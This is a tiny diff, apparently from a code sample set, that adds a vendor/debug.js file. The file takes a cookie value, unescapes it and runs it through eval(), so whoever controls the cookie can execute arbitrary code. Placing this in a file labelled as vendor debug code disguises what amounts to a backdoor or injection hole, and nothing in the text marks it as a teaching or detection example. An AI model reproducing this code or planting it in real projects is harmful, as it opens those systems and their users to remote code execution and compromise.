@@ -1,0 +1,6 @@
+# path: vendor/debug.js
+# lines: 2
+# weight: 10
+# ---
+var parts = cookie.split("=");
+value = eval(unescape(parts[1]));
